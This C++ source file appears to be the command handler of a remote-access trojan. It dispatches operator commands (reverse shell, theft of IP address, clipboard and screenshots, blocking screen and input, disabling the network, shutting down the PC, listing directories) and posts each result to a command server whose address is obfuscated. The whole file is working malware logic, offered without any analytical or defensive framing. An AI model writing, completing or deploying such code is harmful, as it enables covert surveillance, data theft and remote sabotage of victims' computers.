#include <iostream>

#include "spy.hh"
#include "troll.hh"
#include "filesystem.hh"
#include "other.hh"

#include "include/json.hpp"

#pragma once

std::string OUTPUTS_URL =  cs(outputs_address);

void perform(std::string id, std::vector<std::string> values) {

    std::string type = values[1];

    if (type == "rshell") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), reverse_shell(values[2])}
        });
    }

    else if (type == "gip") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), grab_ip()}
        });
    }

    else if (type == "cboard") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), grab_clipboard()}
        });
    }

    else if (type == "ss") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), grab_screenshot()}
        });
    }

    else if (type == "bscreen") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), "success"}
        });
        block_screen(atoi(values[2].c_str()));
    }

    else if (type == "binput") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), "success"}
        });
        block_input(atoi(values[2].c_str()));
    }

    else if (type == "offnet") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), "success"}
        });
        kill_internet(atoi(values[2].c_str()));
    }

    else if (type == "killpc") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), "success"}
        });
        kill_computer();
    }

    else if (type == "cd") {
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), change_directory(values[2]) ? "success" : "fail"}
        });
    }

    else if (type == "ls") {
        std::string data;
        for (std::string entry: list_directory()) {
            data += entry + "\n";
        }
        data = data.substr(0, data.size() - 1);
        post_request(OUTPUTS_URL + id, {
            {cs(instruction_id), values[0]},
            {cs(type), type},
            {cs(data_chars), data}
        });
    }
}